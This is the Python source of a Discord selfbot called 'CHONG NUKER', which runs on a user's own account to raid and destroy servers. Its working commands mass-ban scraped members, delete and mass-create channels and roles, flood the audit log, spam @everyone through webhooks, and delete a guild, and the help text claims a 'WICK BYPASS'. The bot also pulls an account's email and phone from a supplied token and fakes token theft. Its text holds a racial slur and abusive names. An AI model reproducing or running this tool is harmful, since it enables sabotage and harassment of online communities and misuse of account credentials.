import discord
import random
import requests as rq
import json
import aiohttp
import httpx
import asyncio
import time
from discord.ext import commands
from colorama import Fore
from threading import Thread
import string
import base64, datetime
from colorama import Fore
import base64
import os
import keep_alive
from tasksio import TaskPool

os.system('clear')
token = "Your Token Here"
languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese, Japan',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}
locales = [
    'da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl',
    'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg',
    'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko'
]


def asciigen(length):
    asc = ""
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc


logb = False
intents = discord.Intents.all()
prefix = '..'
client = commands.Bot(command_prefix=prefix, intents=intents, self_bot=True)
client.remove_command('help')
requests = rq.Session()
headers = {
    'Authorization': token,
}


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.offline)
    print(
        f'\n{Fore.BLUE} │{Fore.GREEN} Connected to {client.user}\n{Fore.BLUE} │ {Fore.GREEN} Guilds : {len(client.guilds)}{Fore.RESET}\n{Fore.BLUE} │ {Fore.GREEN} Cached users : {len(client.users)}'
    )


####################### FUNCTIONS


def make_roles(session):
    tasks = []
    for i in range(100):
        name = 'grb on top'
        payload = {
            'color': 0x313131,
            'name': name,
        }
        tasks.append(
            session.post(f'https://discord.com/api/v9/guilds/{guild2}/roles',
                         headers=headers,
                         json=payload))
    return tasks


async def deletech(ch, session):
    while True:
        rq = await session.delete(f"https://discord.com/api/v9/channels/{ch}",
                                  headers=headers)
        if rq.status_code == 429:
            json = rq.json()
            await asyncio.sleep(json['retry_after'])
        else:
            break


async def baan(guild, id, session):
    while True:
        rq = await session.put(
            f"https://discord.com/api/v9/guilds/{guild}/bans/{id}",
            headers=headers)
        if rq.status_code == 429:
            json = rq.json()
            await asyncio.sleep(json['retry_after'])
        else:
            #logging.info(f'Executed {id}')
            break
    print(rq.status_code)


async def makech(name, session):
    while True:
        a = await session.post(
            f'https://discord.com/api/v9/guilds/{guild2}/channels',
            headers=headers,
            json={
                'type': '0',
                'name': name
            })
        if a.status_code == 429:
            json = await a.json()
            await asyncio.sleep(json['retry_after'])
        else:
            break


####################### COMMANDS #######################

channels = []


@client.command()
async def superraid(ctx):
    await ctx.message.delete()
    count = 0
    roles = []
    for role in ctx.guild.roles:
        if role.name == '@everyone':
            pass
        else:
            roles.append(f'<@&{role.id}>')
    for i in range(20):
        await ctx.send('**@everyone Higuys its Chong**' +
                       f' '.join([random.choice(roles) for i in range(15)]))
        await ctx.send('**@everyone Trolled :clown:**' +
                       f' '.join([random.choice(roles) for i in range(15)]))
        await ctx.send('**@everyone Raided :skull:**' +
                       f' '.join([random.choice(roles) for i in range(15)]))


@client.command()
async def cachetox(ctx, msglink, reason):
    try:
        kid2 = msglink.split('/channels/')[1]
        try:
            kid3 = kid2.split('@me')[1].split('/')
            payload = {
                'channel_id': kid3[1],
                'message_id': kid3[2],
                'reason': reason
            }
            await ctx.send(payload)
        except:
            kid3 = kid2.split('/')
            guid = kid3[0]
            chid = kid3[1]
            msgg = kid3[2]
            payload = {
                'guild_id': guid,
                'channel_id': chid,
                'message_id': msgg,
                'reason': reason
            }
            await ctx.send(payload)
        requests.post('https://discord.com/api/v9/report',
                      headers=headers,
                      payload=payload)
    except:
        await ctx.send('Thats not a message link kid')


@client.command()
async def b64(ctx, tp, *, strng):
    if tp == 'encode':
        message_bytes = strng.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        await ctx.send(f'```ini\n[{strng}]\n{base64_bytes}```')
    if tp == 'decode':
        base64_bytes = strng.encode('ascii')
        message_bytes = base64.b64decode(base64_bytes)
        message = message_bytes.decode('ascii')
        await ctx.send(f'```ini\n[{strng}]\n{message}```')


@client.command()
async def grabhook(ctx):
    await ctx.message.delete()
    for w in await ctx.guild.webhooks():
        print(f'{w.url}\n')


def rapestaff():
    for _ in range(2):
        global url, headers, headers2
        url = f"https://ptb.discordapp.com/api/v6/guilds/{guid}"
        url2 = f'https://ptb.discordapp.com/api/v6/guilds/{guid}'

        headers = {
            'authorization': token,
            'accept-encoding': "gzip, deflate, br",
            'accept-language': "en-US",
            'user-agent':
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36",
            'accept': "*/*",
            'authority': "discordapp.com",
            'Content-Type': "application/json",
            'Cache-Control': "no-cache",
            'Host': "discordapp.com",
            'Connection': "keep-alive",
            'cache-control': "no-cache"
        }

        headers2 = {
            'authorization': token,
            'accept-encoding': "gzip, deflate, br",
            'accept-language': "en-US",
            'user-agent':
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36",
            'accept': "*/*",
            'authority': "discordapp.com",
            'Content-Type': "application/json",
            'Cache-Control': "no-cache",
            'Host': "discordapp.com",
            'Connection': "keep-alive",
            'cache-control': "no-cache"
        }

        while True:
            payload2 = '{"description":null,"features":["NEWS","WELCOME_SCREEN_ENABLED"],"preferred_locale":"en-US","rules_channel_id":null,"public_updates_channel_id":null}'
            re = requests.patch(url=url, data=payload2, headers=headers2)
            if re.status_code == 429:
                time.sleep(re.json()['retry_after'])
            else:
                while True:
                    payload = '{"system_channel_flags":3,"public_updates_channel_id":"' + channel + '"}'
                    re = requests.patch(url=url, data=payload, headers=headers)
                    if re.status_code == 429:
                        time.sleep(re.json()['retry_after'])
                    else:
                        break
                    break


@client.command()
async def staff(ctx):
    await ctx.message.delete()
    headers2 = {
        'authorization': token,
        'accept-encoding': "gzip, deflate, br",
        'accept-language': "en-US",
        'user-agent':
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36",
        'accept': "*/*",
        'authority': "discordapp.com",
        'Content-Type': "application/json",
        'Cache-Control': "no-cache",
        'Host': "discordapp.com",
        'Connection': "keep-alive",
        'cache-control': "no-cache"
    }
    global guid, channel
    guid = str(ctx.guild.id)
    channel = str(ctx.channel.id)
    url = f"https://ptb.discordapp.com/api/v6/guilds/{guid}"
    payload2 = '{"description":null,"features":["NEWS","WELCOME_SCREEN_ENABLED"],"preferred_locale":"en-US","rules_channel_id":null,"public_updates_channel_id":null}'
    requests.patch(url=url, data=payload2, headers=headers2)
    for i in range(35):
        Thread(target=rapestaff).start()


channels = []


@client.command()
async def chdel2(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    async with httpx.AsyncClient() as session:
        async with TaskPool(5_000) as tasks:
            for ch in ctx.guild.channels:
                await tasks.put(deletech(ch.id, session))


@client.command()
async def av(ctx, *, avamember: discord.User = None):
    await ctx.message.delete()
    userAvatarUrl = avamember.avatar_url
    await ctx.send(userAvatarUrl)


@client.command()
async def messagelogger(ctx):
    await ctx.message.delete()
    global logb
    logb = True

    @client.event
    async def on_message(message):
        if logb:
            if message.author == client.user:
                pass
            else:
                print(
                    f'[{Fore.LIGHTBLUE_EX}{message.author}{Fore.RESET}] : {Fore.LIGHTGREEN_EX}{message.content}{Fore.RESET}'
                )


@client.command()
async def spam(ctx, amount, *, message):
    await ctx.message.delete()
    async with TaskPool(150) as tasks:
        if message == 'lagger':
            for i in range(int(amount)):
                await tasks.put(ctx.send(asciigen(1999)))
        else:
            for i in range(int(amount)):
                await tasks.put(ctx.send(message))


def chunks(l, n):
    n = max(1, n)
    return (l[i:i + n] for i in range(0, len(l), n))


@client.command(aliases=['banall', 'ball'])
async def massban(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    async with httpx.AsyncClient() as client:
        for i in chunks(members, 50):
            tasks = []
            for user in i:
                tasks.append(
                    asyncio.create_task(baan(ctx.guild.id, user, client)))
            await asyncio.gather(*tasks)


@client.command()
async def scrapemembs(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    global guild2
    guild2 = ctx.guild.id
    global members2
    guild = ctx.guild
    members2 = await guild.chunk()
    global members
    members = []
    for member in members2:
        members.append(member.id)
    members.remove(ctx.author.id)
    await ctx.send(f'Scraped {len(members)} members!', delete_after=3)


roles = []

toe = token


@client.command()
async def help(ctx, category=None):
    try:
        await ctx.message.delete()
    except:
        pass
    hide = '_ _||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||'
    if category == None:
        msg = f"""
> ```ini
> 
> [ CHONG | SELFBOT ]
> [ MAIN | PANEL ]
> help nuke - shows nuke panel 
> help exploits - shows exploits panel
> help manual - shows manual nuke panel
> help misc - shows misc panel```{hide}https://bestanimations.com/Military/Explosions/planets-exploding-animation-s.gif"""
    if category == 'misc':
        embedVar = discord.Embed(title="__**CHONG NUKER**__",
                                 description="Misc Commands",
                                 color=0x690303)
        embedVar.add_field(name="`purge`",
                           value="**Purges the amount of messages**",
                           inline=True)
        embedVar.add_field(name="`fm`",
                           value="**Jumps to first message in the channel**",
                           inline=True)
        embedVar.add_field(name="`ping`",
                           value="**Gets the latency of the selfbot**",
                           inline=True)
        embedVar.add_field(
            name="`status_code (on/off/idle/dnd)`",
            value="**Sets status_code for you when you go offline**",
            inline=True)
        embedVar.add_field(name="`otax (user id)`",
                           value="**Steals the user's token**",
                           inline=True)
        embedVar.add_field(
            name="`ghost (message)`",
            value=
            "**Sends a message then deletes it right after, can be used for ghostpinging**",
            inline=True)
        embedVar.add_field(name='`whois`',
                           value='**Shows all possible info of an user**',
                           inline=True)
        embedVar.set_image(
            url=
            'https://i.pinimg.com/originals/74/21/51/7421514f6a6b54bc3ee389e09833fc38.gif'
        )
    if category == 'nuke':
        msg = """
> ```ini
> 
> [ CHONG | SELFBOT ]
> [ NUKE | PANEL ]
> nuke - nukes the server
> scrapemembs - scrapes the members on the server
> ban - massbans the scraped members
> channelbomb2 - spams the channels (faster speed)
> rolenuke - nukes the role list (not working)```_ _||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||https://cdn.discordapp.com/attachments/849570405688541194/895331605273526352/anime-explosion_1.gif"""

    if category == 'manual':
        embedVar = discord.Embed(title="__**CHONG NUKER**__",
                                 description="Manual Nuke Commands",
                                 color=0xFFFFFA)
        embedVar.add_field(
            name=f"`chdel`",
            value="**Deletes all the channels (USED FOR WICK BYPASS)**",
            inline=True)
        embedVar.add_field(
            name="`channelbomb`",
            value="**Mass-creates channels (USED FOR WICK BYPASS)**",
            inline=True)
        embedVar.add_field(name=f"`chdel2`",
                           value="**Deletes all the channels**",
                           inline=True)
        embedVar.add_field(name="`channelbomb2`",
                           value="**Mass-creates channels**",
                           inline=True)
        embedVar.add_field(name=f"`roledel`",
                           value="**Deletes all the roles**",
                           inline=True)
        embedVar.add_field(name=f"`roles`",
                           value="**Creates 100 roles**",
                           inline=True)
        embedVar.set_image(
            url=
            'https://media.discordapp.net/attachments/859235400434057237/859399736217436180/doom_eternal.gif'
        )
    await ctx.send(msg)


@client.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    await asyncio.gather(*[
        asyncio.create_task(m.delete())
        async for m in ctx.message.channel.history(limit=amount).filter(
            lambda m: m.author == client.user).map(lambda m: m)
    ])


@client.command()
async def backup(ctx, tt=None):
    if tt is None:
        await ctx.send('No backup type specified!')
    else:
        for c in ctx.guild.channels:
            await c.delete()
        if tt == 'grb':
            a = await ctx.guild.create_category('※ | Staff  ❯❯')
            await a.create_text_channel('☾✰☽-welcome')
            a1 = await ctx.guild.create_category('𝕍𝔼ℝ𝕀𝔽𝕀ℂ𝔸𝕋𝕀𝕆ℕ')
            await a1.create_text_channel('☾✰☽-verification-questions')
            a2 = await ctx.guild.create_category('𝕀𝕄ℙ𝕆ℝ𝕋𝔸ℕ𝕋')
            a3 = await ctx.guild.create_category('𝕆ℕ 𝕋𝕆ℙ𝕀ℂ')
            a4 = await ctx.guild.create_category('𝕆𝔽𝔽 𝕋𝕆ℙ𝕀ℂ')
            a5 = await ctx.guild.create_category('𝕍𝕆𝕀ℂ𝔼')
            await a2.create_text_channel('☾✰☽-rules')
            await a2.create_text_channel('☾✰☽-announcements')
            await a2.create_text_channel('☾✰☽-partners')
            await a2.create_text_channel('☾✰☽-coalition')
            await a2.create_text_channel('☾✰☽-colony-network')
            await a3.create_text_channel('☾✰☽-general')
            await a3.create_text_channel('☾✰☽-suggestions')
            await a3.create_text_channel('☾✰☽-questions')
            await a4.create_text_channel('☾✰☽-basement')
            await a4.create_text_channel('☾✰☽-bot-commands')
            await a4.create_text_channel('☾✰☽-spam')
            await a5.create_voice_channel('☾✰☽ Voice')
            await a5.create_voice_channel('☾✰☽ Music')
            await a5.create_voice_channel('☾✰☽ Two People')
            perms = discord.Permissions(administrator=True)
            await ctx.guild.create_role(name='PINKSTAR',
                                        permissions=perms,
                                        color=discord.Colour(0x070303))


async def lagserv(c, ctx, client1):
    while 1:
        x = await client1.put(
            f'https://discord.com/api/v9/channels/{c.id}/permissions/{ctx.guild.id}',
            headers=headers,
            json={
                'id': ctx.guild.id,
                'type': '0',
                'allow': '0',
                'deny': '1024'
            })
        if x.status_code == 429:
            await asyncio.sleep(x.json()['retry_after'])
        else:
            while 1:
                x = await client1.put(
                    f'https://discord.com/api/v9/channels/{c.id}/permissions/{ctx.guild.id}',
                    headers=headers,
                    json={
                        'id': ctx.guild.id,
                        'type': '0',
                        'allow': '0',
                        'deny': '0'
                    })
                if x.status_code == 429:
                    await asyncio.sleep(x.json()['retry_after'])
                else:
                    break
                break


@client.command()
async def lagg(ctx):
    await ctx.message.delete()
    with httpx.AsyncClient() as client1:
        with TaskPool(1000) as taskpol:
            for c in ctx.guild.text_channels:
                await taskpol.put(lagserv(c, ctx))


names = ["grb-on-top", "heil-chong", "heil-grb", "nuked-by-grb"]


@client.command()
async def perden(ctx, id):
    r = requests.post(
        'https://discord.com/api/v9/users/@me/channels',
        headers=headers,
        json={'recipients': [861625901073694761, 899713959274360842]})
    print(r.content)


@client.command()
async def channelbomb2(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    global guild2
    guild2 = ctx.guild.id
    async with httpx.AsyncClient() as session:
        async with TaskPool(5_000) as tasks:
            for i in range(400):
                await tasks.put(
                    asyncio.create_task(makech(random.choice(names), session)))


@client.command()
async def ghost(ctx, *, msg):
    await ctx.message.delete()
    x = await ctx.send(msg)
    await x.delete()


@client.command()
async def whois(ctx, *, user: discord.User = None):
    x = await ctx.send('Scraping data...')
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    userid = str(user.id)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    creation = user.created_at.strftime(date_format)
    avatar = user.avatar_url
    if user is None:
        user = ctx.author
    if user is not None:
        mutualsv = []
        friends = []
        connections = []
        with httpx.Client() as client:
            r = client.get(
                f'https://canary.discord.com/api/v9/users/{userid}/profile?with_mutual_guilds=true',
                headers={
                    'Authorization': token
                }).json()
            user2 = r['user']
            try:
                bio = user2['bio']
            except:
                bio = 'Could not reach'
            try:
                for g in r['mutual_guilds']:
                    gid = g['id']
                    cc = client.get(f'https://discord.com/api/v9/guilds/{gid}',
                                    headers={
                                        'Authorization': token
                                    }).json()
                    mutualsv.append(cc['name'])
            except:
                mutualsv.append('Could not reach')
            try:
                for g in r['connected_accounts']:
                    t = g['type']
                    n = g['name']
                    connections.append(f' {t} - {n}')
            except:
                connections.append('Could not reach')
            n = r['premium_since']
            if n is None:
                nitro = 'None'
            else:
                nitro = n
            try:
                r2 = client.get(
                    f'https://canary.discord.com/api/v9/users/{userid}/relationships',
                    headers=headers).json()
                for fren in r2:
                    friends.append(fren['username'])
            except:
                friends.append('Could not reach')
            info = f'```ini\n[{str(user)}]\nCreation date: {creation}\nUser id: {str(userid)}\nBio : {bio}\nMutual guilds:' + ', '.join(
                [guild for guild in mutualsv]
            ) + f'\nMutual Friends: ' + ', '.join([
                fren for fren in friends
            ]) + f'\nConnections : ' + '\n            '.join(
                [con for con in connections]
            ) + f'\nNitro:{nitro}\nToken: {encodedid}```||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||{avatar}'
            await x.edit(content=info)


@client.command()
async def status_code(ctx, status_code=None):
    try:
        await ctx.message.delete()
    except:
        pass
    if status_code == None:
        await ctx.send('You need to specify a status_code!', delete_after=2)
    if status_code == 'idle':
        await client.change_presence(status=discord.status_code.idle)
    if status_code == 'dnd':
        await client.change_presence(status=discord.status_code.dnd)
    if status_code == 'off':
        await client.change_presence(status=discord.Status.offline)
    if status_code == 'on' or status_code == 'online':
        await client.change_presence(status=discord.Status.online)


async def thr(ch, msg, munker, client):
    while True:
        s = await client.post(
            f"https://discord.com/api/v9/channels/{ch}/messages/{msg}/threads",
            headers={'authorization': token},
            json={'name': munker})
        if s.status_code == 429:
            time.sleep(s.json()['retry_after'])
        else:
            break


@client.command()
async def webhooknuke(ctx):
    await ctx.message.delete()
    for c in ctx.guild.text_channels:
        try:
            await c.create_webhook(name="GRB runs you")
        except:
            pass


@client.command()
async def ping(ctx):
    before = time.monotonic()
    await ctx.message.edit(content="Pinging...")
    ping = (time.monotonic() - before) * 1000
    await ctx.message.edit(content=f"`{int(ping)} ms`")


with open('seized.png', 'rb') as f:
    icon = f.read()


async def change(ctx):
    await ctx.guild.edit(name='Niggered by Chong | Heil GRB', icon=icon)


msg = '@everyone ```diff\n - Nuked by Chong | Heil GRB\n```'


@client.command()
async def auditnuke(ctx):
    guild = ctx.guild.id
    await ctx.message.delete()

    async def flood(guild, client):
        json2 = {
            "features": ["COMMUNITY"],
            "preferred_locale": "en-US",
            "rules_channel_id": "1",
            "public_updates_channel_id": "1"
        }
        json = {
            "description": None,
            "features": ["NEWS"],
            "preferred_locale": "en-US",
            "rules_channel_id": None,
            "public_updates_channel_id": None
        }
        while 1:
            r = await client.patch(
                f"https://discord.com/api/v9/guilds/{guild}",
                headers=headers,
                json=json2)
            if r.status_code == 429:
                await asyncio.sleep(r.json()['retry_after'])
            else:
                while 1:
                    r = await client.patch(
                        f"https://discord.com/api/v9/guilds/{guild}",
                        headers=headers,
                        json=json)
                    if r.status_code == 429:
                        await asyncio.sleep(r.json()['retry_after'])
                    else:
                        break
                    break
                break

    async def audit(taskpol, client):
        for i in range(10):
            await taskpol.put(flood(guild, client))

    async with httpx.AsyncClient() as client:
        async with TaskPool(999) as taskpol:
            for _ in range(50):
                await taskpol.put(audit(taskpol, client))


@client.command(aliases=['sw'])
async def spamwebhooks(ctx):
    await ctx.message.delete()
    links = []
    for w in await ctx.guild.webhooks():
        links.append(w.url)

    async def rape1(session, link):
        try:
            webhook = discord.Webhook.from_url(
                link, adapter=discord.AsyncWebhookAdapter(session))
            while True:
                await rape(webhook)
        except Exception as e:
            print(f'{e}')

    async def rape(webhook):
        try:
            await webhook.send(f"@everyone {msg}")
        except:
            pass

    async with aiohttp.ClientSession() as session:
        tasks = []
        async with TaskPool(100000) as tasks:
            for link in links:
                await tasks.put(rape1(session, link))


@client.command()
async def removeall(ctx):
    async with httpx.AsyncClient() as client:
        r = await client.get(
            f"https://discord.com/api/v9/channels/{ctx.channel.id}",
            headers=headers)
        async with TaskPool(10) as tasks:
            for kid in r.json()['recipients']:
                id = kid['id']
                await tasks.put(
                    client.delete(
                        f"https://discord.com/api/v9/channels/{ctx.channel.id}/recipients/{id}",
                        headers=headers))


@client.command()
async def nuke(ctx, name=None):
    if name == None:
        name = 'nuked-by-GRB'
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    global guild2
    guild2 = ctx.guild.id
    for channel in list(guild.channels):
        channels.append(channel.id)
    async with TaskPool(10) as tasks:
        await tasks.put(chdel2(ctx))
        await tasks.put(channelbomb2(ctx))
        await tasks.put(change(ctx))
        await tasks.put(roledel(ctx))
        await tasks.put(roles(ctx))


@client.command()
async def otax(ctx, user: discord.User = None):
    await ctx.message.delete()
    msg = await ctx.send(f'Otaxing {user.name}...')
    time.sleep(3)
    if user == None:
        await ctx.send('A user is required!', delete_after=1)
    else:
        base64_string = "=="
        while (base64_string.find("==") != -1):
            sample_string = str(user.id)
            sample_string_bytes = sample_string.encode("ascii")
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode("ascii")
        else:
            token = base64_string + "." + 'Y' + ''.join(
                random.choice(string.ascii_letters + string.digits)
                for _ in range(5)) + "." + ''.join(
                    random.choice(string.ascii_letters + string.digits)
                    for _ in range(27))
    await msg.edit(
        content=f'```diff\n-Succesfully otaxed {user.name}\n\n{token}\n```')


hook = False


@client.event
async def on_guild_channel_create(channel):
    if channel.name in names:
        webhook = await channel.create_webhook(name="CHONG OP")
        webhook_url = webhook.url
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(
                str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
            while True:
                await webhook.send(f"{msg}")
                await webhook.send(f"@everyone {asciigen(1984)}")


@client.command()
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me',
                           headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        user = f"{res['username']}#{res['discriminator']}"
        nitro_type = "None"
        if "premium_type" in res:
            if res['premium_type'] == 2:
                nitro_type = "Nitro Premium"
            elif res['premium_type'] == 1:
                nitro_type = "Nitro Classic"
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get(
                'https://canary.discordapp.com/api/v6/users/@me',
                headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            user = f"{res['username']}#{res['discriminator']}"
            #em = discord.Embed(
            #description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
        except KeyError:
            await ctx.send("Invalid token")
    await ctx.send(
        f"```diff\n+{user}\nEmail: {res['email']}\nPhone: {res['phone']}\nCreation Date: {creation_date}\nVerified: {res['verified']}\nNitro: {nitro_type}```"
    )


@client.command()
async def delserv(ctx):
    await ctx.message.delete()
    await ctx.guild.delete()


@client.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    #await ctx.message.delete()
    await client.create_guild(f'backup-{ctx.guild.name}')
    await ctx.send('Backup starting in 2 seconds...')
    await asyncio.sleep(2)
    for g in client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}",
                                            overwrites=cate.overwrites)
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(
                            f"{chann}", overwrites=chann.overwrites)
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(
                            f"{chann}",
                            overwrites=chann.overwrites,
                            topic=chann.topic)
            for role in ctx.guild.roles:
                if role.name == '@everyone':
                    pass
                else:
                    await g.create_role(name=role.name,
                                        color=role.color,
                                        permissions=role.permissions)
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


@client.command()
async def clear(ctx):
    await ctx.message.delete()
    x = await ctx.channel.clone(reason="Has been nuked")
    await ctx.channel.delete()
    await x.send("""
  > ```ini
> [ CHANNEL HAS BEEN CLEARED ]
> ```""")


@client.command()
async def botban(ctx, prefix):
    await ctx.message.delete()
    members = await ctx.guild.chunk()
    for member in members:
        if member.id == ctx.author.id:
            pass
        else:
            await ctx.send(f'{prefix}ban {member.id}')


keep_alive.keep_alive()
client.run(token, bot=False)
